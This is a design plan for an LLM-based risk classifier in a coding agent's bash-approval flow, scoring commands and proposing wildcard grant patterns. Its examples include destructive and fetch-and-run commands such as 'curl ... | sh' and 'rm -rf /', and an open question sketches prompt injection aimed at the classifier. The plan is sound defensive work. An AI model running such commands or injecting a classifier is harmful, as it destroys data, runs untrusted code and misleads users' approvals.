# LLM-based command-risk classifier for bash approval prompts

Design plan for `TODO.md`'s feature-backlog bullet: "Bash approvals, in general, are too
specific (individual filenames; specific pattern args for grep...). In order for user
approvals to be useful, they need to extrapolate to patterns of commands so they aren't
hounded for every overly-specific case one after the next."

Claude: this plan is a **draft**, not ready for implementation. Several load-bearing design
choices are marked as open questions below and need the user's explicit sign-off — most
notably how much weight a risk score should carry (advisory UI bias vs. something closer to
an automatic deny) and how the structured LLM output is actually forced (tool-call vs.
response-format). Do not implement any part of this until it's moved to `ready/` and those
questions are resolved.

## Context

`docs/specs/bash-tool-and-command-permissions.md` and `docs/specs/permissions.md` already
implement a fully deterministic deny/ask/allow pipeline for `BashTool`: `shfmt --to-json`
parses a command into an AST, `CommandPermissionsTable` matches parsed argv against
`commandRules` token patterns (literals plus the `*`/`?`/`**` wildcards — see
`docs/adrs/command-rule-wildcards-double-star-unbounded-anywhere-question-mark-always-optional.md`),
redirection targets go through the same `readDirs`/`writeDirs` tables the file tools use, and
anything the walker can't confidently classify escalates to `"ask"`. When a verdict is
`"ask"`, `PermissionAskScreen` shows the user the item's own source text
(`PermissionAskItem.item_command_text`) and a grant, if the user picks a persistent scope, is
computed by `klorb.permissions.command_grant.compute_command_grant_patterns()` — which
returns whichever existing `ask`-category rule matched, or, if nothing matched at all, **the
exact literal argv the model ran**, with no wildcards. That literal-argv fallback is the
concrete mechanism behind the TODO.md complaint: a model running `grep -rn "TODO" src/foo.py`
today gets offered a grant for exactly that one invocation, not a pattern that would also
cover the next slightly-different `grep` call, so a user who wants to stop being asked about
`grep` in general has to notice that and hand-edit `commandRules.allow` themselves.

This plan adds a second, LLM-driven layer that runs only on items that have already reached
`"ask"` — never changing what gets denied or auto-allowed — and produces three things per
item, using a small/inexpensive model:

1. A `risk_score` from 0 (e.g. `echo hello`) to 10 (e.g. `curl https://x/y.sh | sh`, `rm -rf
   /` — something that should probably just be rejected outright), so the user has a
   quick-scan signal instead of needing to personally parse shell syntax to judge each ask.
2. A one-sentence prose `rationale` explaining *why*, pitched at a software engineer who is
   not necessarily a Linux/bash expert and doesn't want to closely scrutinize every command.
3. A `suggested_pattern` — a token list using the existing `*`/`?`/`**` grammar — that
   replaces today's literal-argv fallback as what's shown and persisted when the user grants
   at a persistent scope, so a single approval actually generalizes the way TODO.md asks for.

The classifier runs over both the whole compound command (for an overall risk read when a
call produced several ask items — e.g. `curl ... | sh && rm -rf ./build`) and each individual
simple command/redirect/forced-ask-reason within it, matching the granularity
`MultiPermissionAskRequired` already asks about one item at a time.

## Goals

* Turn each `"ask"` verdict's persistent-scope grant into a generalized pattern by default,
  instead of the exact literal argv, closing the TODO.md complaint at its root cause.
* Give the user a fast, plain-English risk signal and rationale so approving a `BashTool` ask
  doesn't require them to personally read and understand shell syntax every time.
* Cover both the compound-call level and the individual-item level, matching the existing
  multi-item-ask architecture rather than collapsing a compound command into one verdict.

## Non-goals

* **This is a UX/ergonomics layer, not a new security boundary.** The deterministic
  deny/ask/allow verdict computed by `CommandPermissionsTable`, `forced_ask_reasons`, and
  `evaluate_write()`/`resolve_and_evaluate_read()` on redirects is unchanged and remains
  authoritative — the classifier only ever runs on a candidate that has *already* resolved to
  `"ask"`, and never itself promotes anything to `"allow"` or converts anything to `"deny"`
  without the user seeing and confirming it first (see "Risk score influence" below for the
  one place this needs an explicit decision). This mirrors the reasoning in
  `docs/adrs/bubblewrap-is-defense-in-depth-not-a-classifier-substitute.md`: a probabilistic
  layer sits *alongside* the deterministic one, never in place of it.
* Not a replacement for `shfmt`-based AST parsing. `klorb.permissions.shell_parse` remains the
  only thing that decides *what a command's structure is*; the LLM classifier only ever
  reasons about already-parsed, already-"ask"-routed items, in plain English, for display and
  grant-pattern purposes.
* No change to `permission_framework="auto"`/`"deny"` behavior — see "Where it's invoked"
  below for why the classifier should specifically *not* run in those modes.

## Existing components to build on

* `klorb.permissions.command_access.{WILDCARD_TOKEN, OPTIONAL_TOKEN, UNBOUNDED_TOKEN}` — the
  exact three-symbol grammar (`*` exactly-one, `?` zero-or-one, `**` unbounded-anywhere) the
  classifier's `suggested_pattern` must emit, reusing the same semantics
  `CommandPermissionsTable._matches` already implements — not a fourth kind of pattern syntax.
* `klorb.permissions.table.PermissionAskItem` — already carries `command` (the exact argv,
  when this is a command-pattern item), `item_command_text` (this item's own source text), and
  `is_compound` (whether the parent call had more than one simple command). These are exactly
  the inputs the classifier needs per item; no new upstream data collection required.
* `klorb.permissions.command_grant.compute_command_grant_patterns()` — today's literal-argv
  fallback this plan's `suggested_pattern` is meant to replace as the default proposal (falling
  back to today's behavior whenever the classifier didn't run or failed — see "Failure
  handling").
* `klorb.tui.permission_ask_screen.PermissionAskScreen` and `ReplApp._on_permission_ask`
  (`klorb/src/klorb/tui/repl.py`) — the interactive site where `compute_grant_paths()`/
  `compute_command_grant_patterns()` are already called read-only, purely to render modal copy.
  This is the natural site to also invoke the classifier — see "Where it's invoked" below.
* `klorb.api_provider.ApiProvider.send_prompt(messages, system_prompt, model, ...)` and
  `Session.provider` (`klorb/src/klorb/session.py`) — the existing mechanism for sending a
  prompt to a model. The classifier reuses the *same* `ApiProvider` instance the main
  conversation uses, just with a different (cheap) `model` string; no second provider or client
  needs to be built.
* `klorb.models.gpt_5_nano.Gpt5NanoModel` (`openai/gpt-5-nano`) — klorb's existing default
  model, already the obvious inexpensive-classifier candidate, per `docs/specs/model-framework.md`.
* `klorb.tools.registry.ToolRegistry.tool_definitions()` — the existing
  `{"type": "function", "function": {"name", "description", "parameters"}}` shape (pydantic
  schema via `model_json_schema()`) this codebase already uses for model-facing structured
  output. The classifier's forced-JSON-output request should look like this, not invent a
  second schema convention — see "Structured output" below for the one open question this
  still leaves (forcing the model to actually call it).

## Design

### New module: `klorb.permissions.risk_classifier`

Two pydantic models:

```python
class ItemRiskAssessment(BaseModel):
    item_id: str          # correlates back to the PermissionAskItem this is about
    risk_score: int        # 0 (fully inert) .. 10 (should be rejected outright)
    rationale: str          # one sentence, plain English, for a non-bash-expert engineer
    suggested_pattern: list[str]  # token pattern using "*"/"?"/"**", per CommandPermissionsTable

class CommandRiskReport(BaseModel):
    overall_risk_score: int
    overall_rationale: str
    items: list[ItemRiskAssessment]
```

`classify_command_risk(command_text: str, items: list[PermissionAskItem], *, api_provider:
ApiProvider, model: str, timeout: float) -> CommandRiskReport | None` — sends one request
covering the whole compound command and every one of its ask items in a single round trip,
returns `None` on any failure (network error, timeout, malformed/missing structured output) so
callers can fall back cleanly. Pure with respect to the permission system itself: this
function never touches `CommandRules`, `SessionConfig`, or any grant file.

### Prompt construction

System prompt teaches the model:

* Its job is to help a software engineer — who is not necessarily a Linux/shell expert and
  doesn't want to closely scrutinize every command — decide whether to approve a shell command
  a coding agent wants to run.
* The exact `*`/`?`/`**` grammar, using the same worked examples already in
  `docs/specs/bash-tool-and-command-permissions.md`'s pattern table, so `suggested_pattern`
  values are actually valid `CommandPermissionsTable` rules, not free-form globs.
* A rubric anchoring the 0–10 scale: 0 for something with no meaningful side effect regardless
  of arguments (`echo`, `pwd`, `ls`); low-single-digits for routine, easily-reversible dev
  workflow (`git status`, `npm test`); mid-range for commands with a real but bounded blast
  radius (`git push`, `rm` inside the workspace); high/near-10 for anything destructive,
  irreversible, or capable of exfiltrating data or executing untrusted remote content
  (`rm -rf /`, `curl <url> | sh`, writing to `~/.ssh`).
* Instruction to propose the **least** permissive generalization consistent with what's
  actually safe to repeat — e.g. generalize a file path or commit message argument before
  generalizing a destructive flag; never suggest widening `-rf`, `--force`, or similar into a
  wildcard position.

User content per request: the full `command_text`, then, per item, its `item_command_text`,
`resource_description`, whether it's a command-pattern item (`command` set), a redirect item
(`path`/`is_write` set), or a structural forced-ask item (neither set — see
`PermissionAskItem`'s own docstring), and `is_compound`.

### Structured output

The response must deserialize directly into `CommandRiskReport` — no free-text parsing.
Mirroring `ToolRegistry.tool_definitions()`'s existing shape, the natural approach is a single
function-calling tool definition (e.g. `ReportCommandRisk`, schema =
`CommandRiskReport.model_json_schema()`) offered via `send_prompt(..., tools=[...])`. **Open
question, not resolved by this plan:** `ApiProvider.send_prompt()` has no way today to force a
specific tool call (no `tool_choice` parameter) or to request OpenAI-style structured-output
`response_format`; offering a single tool is usually enough to get a capable model to call it,
but a small/cheap model is more likely to answer in prose instead. Implementation will need
to either add a `tool_choice`-forcing parameter to `send_prompt()` (same additive-parameter
pattern already used for `reasoning`/`tools`) or switch to `response_format={"type":
"json_schema", ...}` if OpenRouter's pass-through supports it for the chosen model — verify
against the real API before committing to one.

### Where it's invoked — at display time, not verdict time

The classifier must **not** be called from inside `BashTool.apply()`/`_classify()`. It should
be invoked from `ReplApp._on_permission_ask` (or any future non-TUI equivalent), immediately
before `PermissionAskScreen` is actually shown — the same site that already computes
`compute_grant_paths()`/`compute_command_grant_patterns()` read-only for modal copy. This
matters because:

* `permission_framework in {"auto", "deny"}` and any headless run never show a modal at all —
  paying for an LLM round trip there would be pure waste, and this siting means it's
  structurally impossible to do so by construction, not just by a config flag.
* `MultiPermissionAskRequired` items are asked about serially (`Session._resolve_multi_permission_ask`);
  batching the whole compound command's items into **one** classifier call up front (rather
  than one call per item as each modal opens) bounds latency for a call with several ask items
  to a single extra round trip, not N of them.

### Model selection and config

New `tools.bash.riskClassifier.*` on-disk keys (dot-delineated lowerCamelCase, per
`docs/specs/process-and-session-config.md`'s on-disk key naming convention):

```json
{
  "tools.bash.riskClassifier.enabled": true,
  "tools.bash.riskClassifier.model": "openai/gpt-5-nano",
  "tools.bash.riskClassifier.timeout": 5.0
}
```

* `enabled` — an escape hatch for a user who doesn't want command text sent to a second LLM
  call at all (cost, latency, or data-sensitivity reasons); when `false`, behavior is exactly
  today's: no risk badge/rationale, `compute_command_grant_patterns()`'s literal-argv fallback
  used as-is.
* `model` — independent of `SessionConfig.model` (the main conversation's model), since an ask
  can happen regardless of which model — including an expensive frontier one — is driving the
  conversation. Defaults to the existing cheap built-in default.
* `timeout` — a short, separate timeout from `tools.bash.timeout` (which bounds the actual
  shell command's runtime); this bounds an interactive round trip that happens *before* the
  command even runs, so it should fail fast rather than stall the approval modal.

### Failure handling

Any failure mode — network error, timeout, missing/malformed structured output, tool not
called — results in `classify_command_risk()` returning `None`. Callers treat this exactly
like `enabled=false`: no risk badge, no rationale, `compute_command_grant_patterns()`'s
existing literal fallback used for the grant pattern. The ask flow itself must never be
blocked, delayed indefinitely, or failed by a classifier error.

### Caching

An in-memory cache in `session.tool_state["BashRiskClassifier"]` (per
`docs/specs/tool-framework.md`'s `Session.tool_state` convention), keyed by the exact
`item_command_text` (or `command` argv tuple) already assessed, so re-encountering
byte-identical command text later in the same session — e.g. a retried call after a "once"
decision, or the same simple command appearing in two different tool calls — doesn't re-spend
an LLM call. Not persisted across sessions; `tool_state` never is.

### UI changes (`PermissionAskScreen`)

* A risk badge (e.g. a Low/Medium/High label or the raw 0–10 number, colored) shown near the
  existing header, when a `CommandRiskReport` is available.
* The one-sentence `rationale` shown beneath the existing `item_command_text` preview.
* The "this workspace"/"for me" grid rows' copy shows `suggested_pattern` (rendered as a
  command line, e.g. `git push *`) as what will actually be persisted, in place of today's
  copy derived purely from `compute_command_grant_patterns()`'s literal fallback, whenever a
  report is present for that item — falling back to today's copy otherwise. The pattern shown
  here must be the *exact* pattern persisted; nothing should ever write a wildcarded rule to
  `commandRules` that the user didn't see spelled out first.

### Risk score influence on the ask flow

Recommended default: bias `PermissionAskScreen`'s initial grid cursor cell (today it starts on
the previous prompt's remembered cell, per `docs/adrs/permission-ask-screen-uses-a-2d-action-by-scope-grid.md`)
toward `Deny` for a high `risk_score` (e.g. >= 8) and toward `Allow (this session)` for a low
one (e.g. <= 2), leaving the existing remembered-cell behavior for the middle of the range.
This changes only which cell is pre-highlighted — the user can still navigate to and confirm
any cell regardless of score.

**Open question, needs explicit user sign-off:** the task description that motivated this plan
says a score of 10 "should probably be just rejected immediately." Whether that means:

(a) cursor-bias only, as above (score never removes any option, just nudges the default), or
(b) something stronger at the very top of the range — e.g. disabling/hiding the `Allow` column
    entirely above some threshold, requiring a distinct, deliberate override step to still run it —

is a real, consequential trust-model decision this draft does not make. Every other verdict in
this permission system is produced by a deterministic AST walk; letting a probabilistic LLM
score have any unilateral power to block an action (even one nominally reversible via a
distinct override step) is a meaningfully different guarantee, and should not be decided by
default without the user weighing in explicitly.

## Worked examples

* `grep -rn "TODO" src/foo.py` — today's literal grant would be exactly that argv. The
  classifier scores this low (e.g. 1), rationale along the lines of "a read-only text search,
  no files are modified," and proposes `["grep", "**"]` (or a narrower `["grep", "-rn", "*",
  "**"]` if the model chooses to keep the flag combination literal) so a persistent grant
  actually covers the next slightly different `grep` invocation too.
* `git push --force origin main` — one simple-command item. Scores mid-to-high (e.g. 6–7),
  rationale explaining a force-push can overwrite remote history other people rely on, and
  proposes `["git", "push", "**"]` rather than generalizing away `--force` itself into a
  wildcard, per "propose the least permissive generalization" above.
* `curl https://example.com/install.sh | sh` — the same worked example
  `docs/specs/bash-tool-and-command-permissions.md` already uses for why this construct
  escalates to `"ask"` in the first place (a pipe into a non-`SAFE_STDIN_CONSUMERS` command).
  Scores at or near 10, rationale naming "runs an arbitrary script downloaded from the
  internet, with no way to review it first" — the case the open question above is about.

## Out of scope

* Designing the exact `tool_choice`/`response_format` request shape — an implementation-time
  decision, verified against the real OpenRouter/model behavior, not speculated here (see
  "Structured output").
* Recording risk-classifier verdicts into a structured audit log — a real future goal
  (`docs/specs/permissions.md`'s "Multi-item asks" area and `TODO.md`'s bash-tool bullet both
  gesture at audit logging already), not required for a first version.
* Applying this same classifier module to any other future `PermissionsTable` resource kind
  (e.g. the still-unbuilt website-access table `TODO.md` names) — plausible reuse, not designed
  here.
* Any change to how `CommandPermissionsTable`/`forced_ask_reasons`/redirect verdicts are
  computed — strictly out of scope; the classifier only ever runs downstream of an existing
  `"ask"` verdict.

## Open questions

1. Forced structured-output mechanism (tool-choice vs. `response_format`) — pick and verify
   during implementation; may require an additive `send_prompt()` parameter.
2. High-score UX: cursor-bias-only vs. something stronger at score 9–10 — needs the user's
   explicit decision (see "Risk score influence on the ask flow").
3. Today's `"Other..."` grid option means "deny, with free-text redirection" — there's no
   existing affordance for "allow, but let me hand-edit the suggested pattern before granting."
   Worth adding one so a user can tweak the LLM's wildcarding rather than accept-or-reject it
   as-is, but the exact UI for that isn't designed here.
4. Whether a single fixed cheap model is right for every case, or whether a command the
   deterministic layer already flagged as especially concerning (e.g. several
   `forced_ask_reasons` at once) should escalate to a stronger/more expensive model for that
   one classification call — a real cost/quality tradeoff, not resolved here.
5. Prompt-injection surface: `command_text` can itself carry adversarial content (e.g. a
   heredoc payload) aimed at the classifier rather than at the real shell, and the
   classifier's own `rationale` is then displayed verbatim to the user — a hostile rationale
   could try to talk the user into approving something dangerous. At minimum, `rationale` must
   be rendered so it's visually distinguishable from trusted harness copy, never presented as
   an authoritative safety guarantee. Full hardening is its own follow-up, in the same spirit
   as `TODO.md`'s ReadFile secret-scrubbing item.
6. Whether classifier LLM calls should be folded into the session's own token/cost accounting
   shown in the REPL status row, since they're real spend against the same account.

## Future work

* Structured audit logging of risk-classifier output alongside permission decisions.
* A user-tunable risk rubric or system-prompt override, for teams with their own risk
  tolerance conventions.
* Reusing `klorb.permissions.risk_classifier` for a future website-access `PermissionsTable`.

## See also

* docs/specs/bash-tool-and-command-permissions.md
* docs/specs/permissions.md
* docs/specs/model-framework.md
* docs/specs/openrouter-prompt-client.md
* docs/specs/tool-framework.md
* docs/adrs/command-rule-wildcards-double-star-unbounded-anywhere-question-mark-always-optional.md
* docs/adrs/bubblewrap-is-defense-in-depth-not-a-classifier-substitute.md
* docs/adrs/permission-ask-screen-uses-a-2d-action-by-scope-grid.md
* docs/adrs/permission-ask-item-carries-raw-command-text-as-its-own-field.md
